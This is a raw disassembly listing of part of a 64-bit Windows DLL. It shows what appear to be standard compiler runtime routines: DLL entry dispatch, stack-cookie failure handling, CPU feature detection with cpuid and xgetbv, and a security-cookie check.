   180003a8a:	48 83 ec 40          	sub    $0x40,%rsp
   180003a8e:	49 8b f0             	mov    %r8,%rsi
   180003a91:	8b fa                	mov    %edx,%edi
   180003a93:	4c 8b f1             	mov    %rcx,%r14
   180003a96:	85 d2                	test   %edx,%edx
   180003a98:	75 0f                	jne    0x180003aa9
   180003a9a:	39 15 18 37 00 00    	cmp    %edx,0x3718(%rip)        # 0x1800071b8
   180003aa0:	7f 07                	jg     0x180003aa9
   180003aa2:	33 c0                	xor    %eax,%eax
   180003aa4:	e9 e5 00 00 00       	jmp    0x180003b8e
   180003aa9:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180003aac:	83 f8 01             	cmp    $0x1,%eax
   180003aaf:	77 40                	ja     0x180003af1
   180003ab1:	48 8b 05 48 18 00 00 	mov    0x1848(%rip),%rax        # 0x180005300
   180003ab8:	48 85 c0             	test   %rax,%rax
   180003abb:	75 05                	jne    0x180003ac2
   180003abd:	8d 58 01             	lea    0x1(%rax),%ebx
   180003ac0:	eb 08                	jmp    0x180003aca
   180003ac2:	ff 15 a0 17 00 00    	call   *0x17a0(%rip)        # 0x180005268
   180003ac8:	8b d8                	mov    %eax,%ebx
   180003aca:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180003ace:	85 db                	test   %ebx,%ebx
   180003ad0:	0f 84 ae 00 00 00    	je     0x180003b84
   180003ad6:	4c 8b c6             	mov    %rsi,%r8
   180003ad9:	8b d7                	mov    %edi,%edx
   180003adb:	49 8b ce             	mov    %r14,%rcx
   180003ade:	e8 a5 fd ff ff       	call   0x180003888
   180003ae3:	8b d8                	mov    %eax,%ebx
   180003ae5:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003ae9:	85 c0                	test   %eax,%eax
   180003aeb:	0f 84 93 00 00 00    	je     0x180003b84
   180003af1:	4c 8b c6             	mov    %rsi,%r8
   180003af4:	8b d7                	mov    %edi,%edx
   180003af6:	49 8b ce             	mov    %r14,%rcx
   180003af9:	e8 52 de ff ff       	call   0x180001950
   180003afe:	8b d8                	mov    %eax,%ebx
   180003b00:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003b04:	83 ff 01             	cmp    $0x1,%edi
   180003b07:	75 36                	jne    0x180003b3f
   180003b09:	85 c0                	test   %eax,%eax
   180003b0b:	75 32                	jne    0x180003b3f
   180003b0d:	4c 8b c6             	mov    %rsi,%r8
   180003b10:	33 d2                	xor    %edx,%edx
   180003b12:	49 8b ce             	mov    %r14,%rcx
   180003b15:	e8 36 de ff ff       	call   0x180001950
   180003b1a:	48 85 f6             	test   %rsi,%rsi
   180003b1d:	0f 95 c1             	setne  %cl
   180003b20:	e8 cb fe ff ff       	call   0x1800039f0
   180003b25:	48 8b 05 d4 17 00 00 	mov    0x17d4(%rip),%rax        # 0x180005300
   180003b2c:	48 85 c0             	test   %rax,%rax
   180003b2f:	74 0e                	je     0x180003b3f
   180003b31:	4c 8b c6             	mov    %rsi,%r8
   180003b34:	33 d2                	xor    %edx,%edx
   180003b36:	49 8b ce             	mov    %r14,%rcx
   180003b39:	ff 15 29 17 00 00    	call   *0x1729(%rip)        # 0x180005268
   180003b3f:	85 ff                	test   %edi,%edi
   180003b41:	74 05                	je     0x180003b48
   180003b43:	83 ff 03             	cmp    $0x3,%edi
   180003b46:	75 3c                	jne    0x180003b84
   180003b48:	4c 8b c6             	mov    %rsi,%r8
   180003b4b:	8b d7                	mov    %edi,%edx
   180003b4d:	49 8b ce             	mov    %r14,%rcx
   180003b50:	e8 33 fd ff ff       	call   0x180003888
   180003b55:	8b d8                	mov    %eax,%ebx
   180003b57:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003b5b:	85 c0                	test   %eax,%eax
   180003b5d:	74 25                	je     0x180003b84
   180003b5f:	48 8b 05 9a 17 00 00 	mov    0x179a(%rip),%rax        # 0x180005300
   180003b66:	48 85 c0             	test   %rax,%rax
   180003b69:	75 05                	jne    0x180003b70
   180003b6b:	8d 58 01             	lea    0x1(%rax),%ebx
   180003b6e:	eb 10                	jmp    0x180003b80
   180003b70:	4c 8b c6             	mov    %rsi,%r8
   180003b73:	8b d7                	mov    %edi,%edx
   180003b75:	49 8b ce             	mov    %r14,%rcx
   180003b78:	ff 15 ea 16 00 00    	call   *0x16ea(%rip)        # 0x180005268
   180003b7e:	8b d8                	mov    %eax,%ebx
   180003b80:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180003b84:	eb 06                	jmp    0x180003b8c
   180003b86:	33 db                	xor    %ebx,%ebx
   180003b88:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180003b8c:	8b c3                	mov    %ebx,%eax
   180003b8e:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   180003b93:	48 83 c4 40          	add    $0x40,%rsp
   180003b97:	41 5e                	pop    %r14
   180003b99:	5f                   	pop    %rdi
   180003b9a:	5e                   	pop    %rsi
   180003b9b:	c3                   	ret
   180003b9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003ba1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003ba6:	57                   	push   %rdi
   180003ba7:	48 83 ec 20          	sub    $0x20,%rsp
   180003bab:	49 8b f8             	mov    %r8,%rdi
   180003bae:	8b da                	mov    %edx,%ebx
   180003bb0:	48 8b f1             	mov    %rcx,%rsi
   180003bb3:	83 fa 01             	cmp    $0x1,%edx
   180003bb6:	75 05                	jne    0x180003bbd
   180003bb8:	e8 ef 05 00 00       	call   0x1800041ac
   180003bbd:	4c 8b c7             	mov    %rdi,%r8
   180003bc0:	8b d3                	mov    %ebx,%edx
   180003bc2:	48 8b ce             	mov    %rsi,%rcx
   180003bc5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003bca:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180003bcf:	48 83 c4 20          	add    $0x20,%rsp
   180003bd3:	5f                   	pop    %rdi
   180003bd4:	e9 9b fe ff ff       	jmp    0x180003a74
   180003bd9:	cc                   	int3
   180003bda:	cc                   	int3
   180003bdb:	cc                   	int3
   180003bdc:	40 53                	rex push %rbx
   180003bde:	48 83 ec 20          	sub    $0x20,%rsp
   180003be2:	48 8b d9             	mov    %rcx,%rbx
   180003be5:	33 c9                	xor    %ecx,%ecx
   180003be7:	ff 15 bb 14 00 00    	call   *0x14bb(%rip)        # 0x1800050a8
   180003bed:	48 8b cb             	mov    %rbx,%rcx
   180003bf0:	ff 15 aa 14 00 00    	call   *0x14aa(%rip)        # 0x1800050a0
   180003bf6:	ff 15 b4 14 00 00    	call   *0x14b4(%rip)        # 0x1800050b0
   180003bfc:	48 8b c8             	mov    %rax,%rcx
   180003bff:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180003c04:	48 83 c4 20          	add    $0x20,%rsp
   180003c08:	5b                   	pop    %rbx
   180003c09:	48 ff 25 a8 14 00 00 	rex.W jmp *0x14a8(%rip)        # 0x1800050b8
   180003c10:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180003c15:	48 83 ec 38          	sub    $0x38,%rsp
   180003c19:	b9 17 00 00 00       	mov    $0x17,%ecx
   180003c1e:	ff 15 9c 14 00 00    	call   *0x149c(%rip)        # 0x1800050c0
   180003c24:	85 c0                	test   %eax,%eax
   180003c26:	74 07                	je     0x180003c2f
   180003c28:	b9 02 00 00 00       	mov    $0x2,%ecx
   180003c2d:	cd 29                	int    $0x29
   180003c2f:	48 8d 0d 2a 36 00 00 	lea    0x362a(%rip),%rcx        # 0x180007260
   180003c36:	e8 a9 00 00 00       	call   0x180003ce4
   180003c3b:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003c40:	48 89 05 11 37 00 00 	mov    %rax,0x3711(%rip)        # 0x180007358
   180003c47:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180003c4c:	48 83 c0 08          	add    $0x8,%rax
   180003c50:	48 89 05 a1 36 00 00 	mov    %rax,0x36a1(%rip)        # 0x1800072f8
   180003c57:	48 8b 05 fa 36 00 00 	mov    0x36fa(%rip),%rax        # 0x180007358
   180003c5e:	48 89 05 6b 35 00 00 	mov    %rax,0x356b(%rip)        # 0x1800071d0
   180003c65:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180003c6a:	48 89 05 6f 36 00 00 	mov    %rax,0x366f(%rip)        # 0x1800072e0
   180003c71:	c7 05 45 35 00 00 09 	movl   $0xc0000409,0x3545(%rip)        # 0x1800071c0
   180003c78:	04 00 c0 
   180003c7b:	c7 05 3f 35 00 00 01 	movl   $0x1,0x353f(%rip)        # 0x1800071c4
   180003c82:	00 00 00 
   180003c85:	c7 05 49 35 00 00 01 	movl   $0x1,0x3549(%rip)        # 0x1800071d8
   180003c8c:	00 00 00 
   180003c8f:	b8 08 00 00 00       	mov    $0x8,%eax
   180003c94:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180003c98:	48 8d 0d 41 35 00 00 	lea    0x3541(%rip),%rcx        # 0x1800071e0
   180003c9f:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   180003ca6:	00 
   180003ca7:	b8 08 00 00 00       	mov    $0x8,%eax
   180003cac:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180003cb0:	48 8b 0d 89 33 00 00 	mov    0x3389(%rip),%rcx        # 0x180007040
   180003cb7:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180003cbc:	b8 08 00 00 00       	mov    $0x8,%eax
   180003cc1:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180003cc5:	48 8b 0d b4 33 00 00 	mov    0x33b4(%rip),%rcx        # 0x180007080
   180003ccc:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180003cd1:	48 8d 0d 30 16 00 00 	lea    0x1630(%rip),%rcx        # 0x180005308
   180003cd8:	e8 ff fe ff ff       	call   0x180003bdc
   180003cdd:	90                   	nop
   180003cde:	48 83 c4 38          	add    $0x38,%rsp
   180003ce2:	c3                   	ret
   180003ce3:	cc                   	int3
   180003ce4:	40 53                	rex push %rbx
   180003ce6:	56                   	push   %rsi
   180003ce7:	57                   	push   %rdi
   180003ce8:	48 83 ec 40          	sub    $0x40,%rsp
   180003cec:	48 8b d9             	mov    %rcx,%rbx
   180003cef:	ff 15 a3 13 00 00    	call   *0x13a3(%rip)        # 0x180005098
   180003cf5:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180003cfc:	33 ff                	xor    %edi,%edi
   180003cfe:	45 33 c0             	xor    %r8d,%r8d
   180003d01:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180003d06:	48 8b ce             	mov    %rsi,%rcx
   180003d09:	ff 15 81 13 00 00    	call   *0x1381(%rip)        # 0x180005090
   180003d0f:	48 85 c0             	test   %rax,%rax
   180003d12:	74 3c                	je     0x180003d50
   180003d14:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180003d19:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180003d1e:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   180003d25:	00 00 
   180003d27:	4c 8b c8             	mov    %rax,%r9
   180003d2a:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180003d2f:	4c 8b c6             	mov    %rsi,%r8
   180003d32:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180003d37:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180003d3c:	33 c9                	xor    %ecx,%ecx
   180003d3e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180003d43:	ff 15 9f 13 00 00    	call   *0x139f(%rip)        # 0x1800050e8
   180003d49:	ff c7                	inc    %edi
   180003d4b:	83 ff 02             	cmp    $0x2,%edi
   180003d4e:	7c ae                	jl     0x180003cfe
   180003d50:	48 83 c4 40          	add    $0x40,%rsp
   180003d54:	5f                   	pop    %rdi
   180003d55:	5e                   	pop    %rsi
   180003d56:	5b                   	pop    %rbx
   180003d57:	c3                   	ret
   180003d58:	48 8d 05 e9 15 00 00 	lea    0x15e9(%rip),%rax        # 0x180005348
   180003d5f:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   180003d66:	00 
   180003d67:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180003d6b:	48 8d 05 c6 15 00 00 	lea    0x15c6(%rip),%rax        # 0x180005338
   180003d72:	48 89 01             	mov    %rax,(%rcx)
   180003d75:	48 8b c1             	mov    %rcx,%rax
   180003d78:	c3                   	ret
   180003d79:	cc                   	int3
   180003d7a:	cc                   	int3
   180003d7b:	cc                   	int3
   180003d7c:	48 83 ec 48          	sub    $0x48,%rsp
   180003d80:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003d85:	e8 ce ff ff ff       	call   0x180003d58
   180003d8a:	48 8d 15 4f 28 00 00 	lea    0x284f(%rip),%rdx        # 0x1800065e0
   180003d91:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003d96:	e8 9d 05 00 00       	call   0x180004338
   180003d9b:	cc                   	int3
   180003d9c:	c2 00 00             	ret    $0x0
   180003d9f:	cc                   	int3
   180003da0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003da5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180003daa:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003daf:	57                   	push   %rdi
   180003db0:	48 83 ec 10          	sub    $0x10,%rsp
   180003db4:	33 c0                	xor    %eax,%eax
   180003db6:	33 c9                	xor    %ecx,%ecx
   180003db8:	0f a2                	cpuid
   180003dba:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   180003dc0:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   180003dc6:	0b d1                	or     %ecx,%edx
   180003dc8:	8b e8                	mov    %eax,%ebp
   180003dca:	b8 01 00 00 00       	mov    $0x1,%eax
   180003dcf:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   180003dd5:	0b d3                	or     %ebx,%edx
   180003dd7:	8d 48 ff             	lea    -0x1(%rax),%ecx
   180003dda:	0f a2                	cpuid
   180003ddc:	8b f9                	mov    %ecx,%edi
   180003dde:	75 5e                	jne    0x180003e3e
   180003de0:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180003de5:	48 c7 05 a8 32 00 00 	movq   $0x8000,0x32a8(%rip)        # 0x180007098
   180003dec:	00 80 00 00 
   180003df0:	48 c7 05 a5 32 00 00 	movq   $0xffffffffffffffff,0x32a5(%rip)        # 0x1800070a0
   180003df7:	ff ff ff ff 
   180003dfb:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180003e00:	74 28                	je     0x180003e2a
   180003e02:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180003e07:	74 21                	je     0x180003e2a
   180003e09:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180003e0e:	74 1a                	je     0x180003e2a
   180003e10:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180003e15:	83 f8 20             	cmp    $0x20,%eax
   180003e18:	77 24                	ja     0x180003e3e
   180003e1a:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180003e21:	00 00 00 
   180003e24:	48 0f a3 c1          	bt     %rax,%rcx
   180003e28:	73 14                	jae    0x180003e3e
   180003e2a:	44 8b 05 03 39 00 00 	mov    0x3903(%rip),%r8d        # 0x180007734
   180003e31:	41 83 c8 01          	or     $0x1,%r8d
   180003e35:	44 89 05 f8 38 00 00 	mov    %r8d,0x38f8(%rip)        # 0x180007734
   180003e3c:	eb 07                	jmp    0x180003e45
   180003e3e:	44 8b 05 ef 38 00 00 	mov    0x38ef(%rip),%r8d        # 0x180007734
   180003e45:	45 33 c9             	xor    %r9d,%r9d
   180003e48:	41 8b f1             	mov    %r9d,%esi
   180003e4b:	45 8b d1             	mov    %r9d,%r10d
   180003e4e:	45 8b d9             	mov    %r9d,%r11d
   180003e51:	83 fd 07             	cmp    $0x7,%ebp
   180003e54:	7c 40                	jl     0x180003e96
   180003e56:	41 8d 41 07          	lea    0x7(%r9),%eax
   180003e5a:	33 c9                	xor    %ecx,%ecx
   180003e5c:	0f a2                	cpuid
   180003e5e:	8b f2                	mov    %edx,%esi
   180003e60:	44 8b cb             	mov    %ebx,%r9d
   180003e63:	0f ba e3 09          	bt     $0x9,%ebx
   180003e67:	73 0b                	jae    0x180003e74
   180003e69:	41 83 c8 02          	or     $0x2,%r8d
   180003e6d:	44 89 05 c0 38 00 00 	mov    %r8d,0x38c0(%rip)        # 0x180007734
   180003e74:	83 f8 01             	cmp    $0x1,%eax
   180003e77:	7c 0d                	jl     0x180003e86
   180003e79:	b8 07 00 00 00       	mov    $0x7,%eax
   180003e7e:	8d 48 fa             	lea    -0x6(%rax),%ecx
   180003e81:	0f a2                	cpuid
   180003e83:	44 8b d2             	mov    %edx,%r10d
   180003e86:	b8 24 00 00 00       	mov    $0x24,%eax
   180003e8b:	3b e8                	cmp    %eax,%ebp
   180003e8d:	7c 07                	jl     0x180003e96
   180003e8f:	33 c9                	xor    %ecx,%ecx
   180003e91:	0f a2                	cpuid
   180003e93:	44 8b db             	mov    %ebx,%r11d
   180003e96:	48 8b 05 eb 31 00 00 	mov    0x31eb(%rip),%rax        # 0x180007088
   180003e9d:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   180003ea1:	c7 05 e5 31 00 00 01 	movl   $0x1,0x31e5(%rip)        # 0x180007090
   180003ea8:	00 00 00 
   180003eab:	c7 05 df 31 00 00 02 	movl   $0x2,0x31df(%rip)        # 0x180007094
   180003eb2:	00 00 00 
   180003eb5:	48 89 05 cc 31 00 00 	mov    %rax,0x31cc(%rip)        # 0x180007088
   180003ebc:	0f ba e7 14          	bt     $0x14,%edi
   180003ec0:	73 1f                	jae    0x180003ee1
   180003ec2:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   180003ec6:	c7 05 c0 31 00 00 02 	movl   $0x2,0x31c0(%rip)        # 0x180007090
   180003ecd:	00 00 00 
   180003ed0:	48 89 05 b1 31 00 00 	mov    %rax,0x31b1(%rip)        # 0x180007088
   180003ed7:	c7 05 b3 31 00 00 06 	movl   $0x6,0x31b3(%rip)        # 0x180007094
   180003ede:	00 00 00 
   180003ee1:	0f ba e7 1b          	bt     $0x1b,%edi
   180003ee5:	0f 83 33 01 00 00    	jae    0x18000401e
   180003eeb:	33 c9                	xor    %ecx,%ecx
   180003eed:	0f 01 d0             	xgetbv
   180003ef0:	48 c1 e2 20          	shl    $0x20,%rdx
   180003ef4:	48 0b d0             	or     %rax,%rdx
   180003ef7:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180003efc:	0f ba e7 1c          	bt     $0x1c,%edi
   180003f00:	0f 83 fc 00 00 00    	jae    0x180004002
   180003f06:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180003f0b:	24 06                	and    $0x6,%al
   180003f0d:	3c 06                	cmp    $0x6,%al
   180003f0f:	0f 85 ed 00 00 00    	jne    0x180004002
   180003f15:	8b 05 79 31 00 00    	mov    0x3179(%rip),%eax        # 0x180007094
   180003f1b:	b2 e0                	mov    $0xe0,%dl
   180003f1d:	83 c8 08             	or     $0x8,%eax
   180003f20:	c7 05 66 31 00 00 03 	movl   $0x3,0x3166(%rip)        # 0x180007090
   180003f27:	00 00 00 
   180003f2a:	89 05 64 31 00 00    	mov    %eax,0x3164(%rip)        # 0x180007094
   180003f30:	41 f6 c1 20          	test   $0x20,%r9b
   180003f34:	74 62                	je     0x180003f98
   180003f36:	83 c8 20             	or     $0x20,%eax
   180003f39:	c7 05 4d 31 00 00 05 	movl   $0x5,0x314d(%rip)        # 0x180007090
   180003f40:	00 00 00 
   180003f43:	89 05 4b 31 00 00    	mov    %eax,0x314b(%rip)        # 0x180007094
   180003f49:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   180003f4e:	48 8b 05 33 31 00 00 	mov    0x3133(%rip),%rax        # 0x180007088
   180003f55:	44 23 c9             	and    %ecx,%r9d
   180003f58:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   180003f5c:	48 89 05 25 31 00 00 	mov    %rax,0x3125(%rip)        # 0x180007088
   180003f63:	44 3b c9             	cmp    %ecx,%r9d
   180003f66:	75 37                	jne    0x180003f9f
   180003f68:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180003f6d:	22 c2                	and    %dl,%al
   180003f6f:	3a c2                	cmp    %dl,%al
   180003f71:	75 25                	jne    0x180003f98
   180003f73:	48 8b 05 0e 31 00 00 	mov    0x310e(%rip),%rax        # 0x180007088
   180003f7a:	83 0d 13 31 00 00 40 	orl    $0x40,0x3113(%rip)        # 0x180007094
   180003f81:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   180003f85:	c7 05 01 31 00 00 06 	movl   $0x6,0x3101(%rip)        # 0x180007090
   180003f8c:	00 00 00 
   180003f8f:	48 89 05 f2 30 00 00 	mov    %rax,0x30f2(%rip)        # 0x180007088
   180003f96:	eb 07                	jmp    0x180003f9f
   180003f98:	48 8b 05 e9 30 00 00 	mov    0x30e9(%rip),%rax        # 0x180007088
   180003f9f:	0f ba e6 17          	bt     $0x17,%esi
   180003fa3:	73 0c                	jae    0x180003fb1
   180003fa5:	48 0f ba f0 18       	btr    $0x18,%rax
   180003faa:	48 89 05 d7 30 00 00 	mov    %rax,0x30d7(%rip)        # 0x180007088
   180003fb1:	41 0f ba e2 13       	bt     $0x13,%r10d
   180003fb6:	73 4a                	jae    0x180004002
   180003fb8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180003fbd:	22 c2                	and    %dl,%al
   180003fbf:	3a c2                	cmp    %dl,%al
   180003fc1:	75 3f                	jne    0x180004002
   180003fc3:	41 8b cb             	mov    %r11d,%ecx
   180003fc6:	41 8b c3             	mov    %r11d,%eax
   180003fc9:	48 c1 e9 10          	shr    $0x10,%rcx
   180003fcd:	25 ff 00 04 00       	and    $0x400ff,%eax
   180003fd2:	83 e1 06             	and    $0x6,%ecx
   180003fd5:	89 05 55 37 00 00    	mov    %eax,0x3755(%rip)        # 0x180007730
   180003fdb:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   180003fe2:	48 f7 d1             	not    %rcx
   180003fe5:	48 23 0d 9c 30 00 00 	and    0x309c(%rip),%rcx        # 0x180007088
   180003fec:	48 89 0d 95 30 00 00 	mov    %rcx,0x3095(%rip)        # 0x180007088
   180003ff3:	3c 01                	cmp    $0x1,%al
   180003ff5:	76 0b                	jbe    0x180004002
   180003ff7:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   180003ffb:	48 89 0d 86 30 00 00 	mov    %rcx,0x3086(%rip)        # 0x180007088
   180004002:	41 0f ba e2 15       	bt     $0x15,%r10d
   180004007:	73 15                	jae    0x18000401e
   180004009:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000400e:	48 0f ba e0 13       	bt     $0x13,%rax
   180004013:	73 09                	jae    0x18000401e
   180004015:	48 0f ba 35 6a 30 00 	btrq   $0x7,0x306a(%rip)        # 0x180007088
   18000401c:	00 07 
   18000401e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180004023:	33 c0                	xor    %eax,%eax
   180004025:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   18000402a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000402f:	48 83 c4 10          	add    $0x10,%rsp
   180004033:	5f                   	pop    %rdi
   180004034:	c3                   	ret
   180004035:	cc                   	int3
   180004036:	cc                   	int3
   180004037:	cc                   	int3
   180004038:	b8 01 00 00 00       	mov    $0x1,%eax
   18000403d:	c3                   	ret
   18000403e:	cc                   	int3
   18000403f:	cc                   	int3
   180004040:	33 c0                	xor    %eax,%eax
   180004042:	39 05 68 30 00 00    	cmp    %eax,0x3068(%rip)        # 0x1800070b0
   180004048:	0f 95 c0             	setne  %al
   18000404b:	c3                   	ret
   18000404c:	c7 05 e2 36 00 00 00 	movl   $0x0,0x36e2(%rip)        # 0x180007738
   180004053:	00 00 00 
   180004056:	c3                   	ret
   180004057:	cc                   	int3
   180004058:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000405d:	55                   	push   %rbp
   18000405e:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   180004065:	ff 
   180004066:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   18000406d:	8b d9                	mov    %ecx,%ebx
   18000406f:	b9 17 00 00 00       	mov    $0x17,%ecx
   180004074:	ff 15 46 10 00 00    	call   *0x1046(%rip)        # 0x1800050c0
   18000407a:	85 c0                	test   %eax,%eax
   18000407c:	74 04                	je     0x180004082
   18000407e:	8b cb                	mov    %ebx,%ecx
   180004080:	cd 29                	int    $0x29
   180004082:	b9 03 00 00 00       	mov    $0x3,%ecx
   180004087:	e8 c0 ff ff ff       	call   0x18000404c
   18000408c:	33 d2                	xor    %edx,%edx
   18000408e:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180004092:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180004098:	e8 a1 02 00 00       	call   0x18000433e
   18000409d:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800040a1:	ff 15 f1 0f 00 00    	call   *0xff1(%rip)        # 0x180005098
   1800040a7:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   1800040ae:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   1800040b5:	48 8b cb             	mov    %rbx,%rcx
   1800040b8:	45 33 c0             	xor    %r8d,%r8d
   1800040bb:	ff 15 cf 0f 00 00    	call   *0xfcf(%rip)        # 0x180005090
   1800040c1:	48 85 c0             	test   %rax,%rax
   1800040c4:	74 3f                	je     0x180004105
   1800040c6:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   1800040cd:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   1800040d4:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1800040db:	00 00 
   1800040dd:	4c 8b c8             	mov    %rax,%r9
   1800040e0:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800040e5:	4c 8b c3             	mov    %rbx,%r8
   1800040e8:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1800040ef:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800040f4:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800040f8:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1800040fd:	33 c9                	xor    %ecx,%ecx
   1800040ff:	ff 15 e3 0f 00 00    	call   *0xfe3(%rip)        # 0x1800050e8
   180004105:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   18000410c:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180004111:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180004118:	33 d2                	xor    %edx,%edx
   18000411a:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   180004121:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180004127:	48 83 c0 08          	add    $0x8,%rax
   18000412b:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180004132:	e8 07 02 00 00       	call   0x18000433e
   180004137:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   18000413e:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180004143:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   18000414a:	40 
   18000414b:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   180004152:	00 
   180004153:	ff 15 6f 0f 00 00    	call   *0xf6f(%rip)        # 0x1800050c8
   180004159:	8b d8                	mov    %eax,%ebx
   18000415b:	33 c9                	xor    %ecx,%ecx
   18000415d:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180004162:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180004167:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   18000416b:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180004170:	ff 15 32 0f 00 00    	call   *0xf32(%rip)        # 0x1800050a8
   180004176:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000417b:	ff 15 1f 0f 00 00    	call   *0xf1f(%rip)        # 0x1800050a0
   180004181:	85 c0                	test   %eax,%eax
   180004183:	75 0d                	jne    0x180004192
   180004185:	83 fb 01             	cmp    $0x1,%ebx
   180004188:	74 08                	je     0x180004192
   18000418a:	8d 48 03             	lea    0x3(%rax),%ecx
   18000418d:	e8 ba fe ff ff       	call   0x18000404c
   180004192:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   180004199:	00 
   18000419a:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   1800041a1:	5d                   	pop    %rbp
   1800041a2:	c3                   	ret
   1800041a3:	cc                   	int3
   1800041a4:	e9 ef 01 00 00       	jmp    0x180004398
   1800041a9:	cc                   	int3
   1800041aa:	cc                   	int3
   1800041ab:	cc                   	int3
   1800041ac:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800041b1:	55                   	push   %rbp
   1800041b2:	48 8b ec             	mov    %rsp,%rbp
   1800041b5:	48 83 ec 30          	sub    $0x30,%rsp
   1800041b9:	48 8b 05 80 2e 00 00 	mov    0x2e80(%rip),%rax        # 0x180007040
   1800041c0:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1800041c7:	2b 00 00 
   1800041ca:	48 3b c3             	cmp    %rbx,%rax
   1800041cd:	75 77                	jne    0x180004246
